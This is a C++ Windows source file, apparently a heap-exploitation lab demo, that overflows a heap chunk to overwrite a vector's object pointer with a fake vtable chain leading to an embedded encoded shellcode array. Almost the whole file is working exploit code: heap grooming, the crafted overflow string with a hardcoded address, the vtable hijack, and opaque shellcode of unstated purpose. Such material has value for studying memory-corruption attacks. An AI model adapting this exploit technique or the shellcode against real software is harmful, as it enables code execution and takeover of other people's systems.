#include <Windows.h>
#include <stdio.h>
#include <vector>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
    void function1() {
    };
    virtual void virtualFunction() {
        printf("test\n");
    };
};

void evilcode(void) {
    printf("Hi~ I'm Evil! * o *\n");
}

struct vfHierarchy {
    int veax;
    int vedx;
    int vecx;
};

unsigned char SHELL[] =
"\xda\xc8\xd9\x74\x24\xf4\xba\xa3\xdb\x5d\xc5\x58\x31\xc9\xb1"
"\x53\x31\x50\x17\x03\x50\x17\x83\x63\xdf\xbf\x30\x9f\x08\xbd"
"\xbb\x5f\xc9\xa2\x32\xba\xf8\xe2\x21\xcf\xab\xd2\x22\x9d\x47"
"\x98\x67\x35\xd3\xec\xaf\x3a\x54\x5a\x96\x75\x65\xf7\xea\x14"
"\xe5\x0a\x3f\xf6\xd4\xc4\x32\xf7\x11\x38\xbe\xa5\xca\x36\x6d"
"\x59\x7e\x02\xae\xd2\xcc\x82\xb6\x07\x84\xa5\x97\x96\x9e\xff"
"\x37\x19\x72\x74\x7e\x01\x97\xb1\xc8\xba\x63\x4d\xcb\x6a\xba"
"\xae\x60\x53\x72\x5d\x78\x94\xb5\xbe\x0f\xec\xc5\x43\x08\x2b"
"\xb7\x9f\x9d\xaf\x1f\x6b\x05\x0b\xa1\xb8\xd0\xd8\xad\x75\x96"
"\x86\xb1\x88\x7b\xbd\xce\x01\x7a\x11\x47\x51\x59\xb5\x03\x01"
"\xc0\xec\xe9\xe4\xfd\xee\x51\x58\x58\x65\x7f\x8d\xd1\x24\xe8"
"\x62\xd8\xd6\xe8\xec\x6b\xa5\xda\xb3\xc7\x21\x57\x3b\xce\xb6"
"\x98\x16\xb6\x28\x67\x99\xc7\x61\xac\xcd\x97\x19\x05\x6e\x7c"
"\xd9\xaa\xbb\xe9\xd1\x0d\x14\x0c\x1c\xed\xc4\x90\x8e\x86\x0e"
"\x1f\xf1\xb7\x30\xf5\x9a\x50\xcd\xf6\xb5\xfc\x58\x10\xdf\xec"
"\x0c\x8a\x77\xcf\x6a\x03\xe0\x30\x59\x3b\x86\x79\x8b\xfc\xa9"
"\x79\x99\xaa\x3d\xf2\xce\x6e\x5c\x05\xdb\xc6\x09\x92\x91\x86"
"\x78\x02\xa5\x82\xea\xa7\x34\x49\xea\xae\x24\xc6\xbd\xe7\x9b"
"\x1f\x2b\x1a\x85\x89\x49\xe7\x53\xf1\xc9\x3c\xa0\xfc\xd0\xb1"
"\x9c\xda\xc2\x0f\x1c\x67\xb6\xdf\x4b\x31\x60\xa6\x25\xf3\xda"
"\x70\x99\x5d\x8a\x05\xd1\x5d\xcc\x09\x3c\x28\x30\xbb\xe9\x6d"
"\x4f\x74\x7e\x7a\x28\x68\x1e\x85\xe3\x28\x3e\x64\x21\x45\xd7"
"\x31\xa0\xe4\xba\xc1\x1f\x2a\xc3\x41\x95\xd3\x30\x59\xdc\xd6"
"\x7d\xdd\x0d\xab\xee\x88\x31\x18\x0e\x99";

int main(int args, char** argv) {
    int i;
    HANDLE hChunk;
    void* allocations[ALLOC_COUNT];
    SomeObject* objects[5];
    SomeObject* obj = new SomeObject();
    printf("SomeObject address : 0x%08x\n", obj);
    int vectorSize = 40;

    HANDLE defaultHeap = GetProcessHeap();

    for (i = 0; i < ALLOC_COUNT; i++) {
        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
        memset(hChunk, 'A', CHUNK_SIZE);
        allocations[i] = hChunk;
        printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
    }

    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
    vector<SomeObject*> v1(vectorSize, obj);
    vector<SomeObject*> v2(vectorSize, obj);
    vector<SomeObject*> v3(vectorSize, obj);
    vector<SomeObject*> v4(vectorSize, obj);
    vector<SomeObject*> v5(vectorSize, obj);
    vector<SomeObject*> v6(vectorSize, obj);
    vector<SomeObject*> v7(vectorSize, obj);
    vector<SomeObject*> v8(vectorSize, obj);
    vector<SomeObject*> v9(vectorSize, obj);
    vector<SomeObject*> v10(vectorSize, obj);

    printf("vector : 0x%08x\n", v1);
    printf("vector : 0x%08x\n", v2);
    printf("vector : 0x%08x\n", v3);
    printf("vector : 0x%08x\n", v4);
    printf("vector : 0x%08x\n", v5);
    printf("vector : 0x%08x\n", v6);
    printf("vector : 0x%08x\n", v7);
    printf("vector : 0x%08x\n", v8);
    printf("vector : 0x%08x\n", v9);
    printf("vector : 0x%08x\n", v10);

    /*--- Attack ---*/
    // A struct for saving   pointers which mimic the access of virtual function (object -> vtable -> vf code)
    vfHierarchy v = { 0x00422000 };     // veax = pointer to SHELL
    v.vedx = (int)&v;                   // vedx = pointer to veax
    v.vecx = (int)&v + 4;               // vecx = pointer to vedx
    printf("Shellcode address : 0x%08x\n", SHELL);
    //printf("Function address : 0x%08x\n", v.veax);
    printf("Vtable address : 0x%08x\n", v.vedx);
    printf("Object address : 0x%08x\n", v.vecx);

    char evilString[] =
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "CCCCDDDD"
        "EEEEEEEEEEEEEEEE"
        "EEEEEEEEEEEEEEEE"
        "\x50\xfd\x19\x00";     // v.vecx, which is the evil object address

    //memset(allocations[2], 'B', CHUNK_SIZE + 8 + 32);
    memcpy(allocations[2], evilString, sizeof(evilString));
    printf("====================================\n");
    printf("After heap overflow, call v1[0]\n");
    printf("====================================\n");
    v1.at(0)->virtualFunction();
    system("PAUSE");
    return 0;
}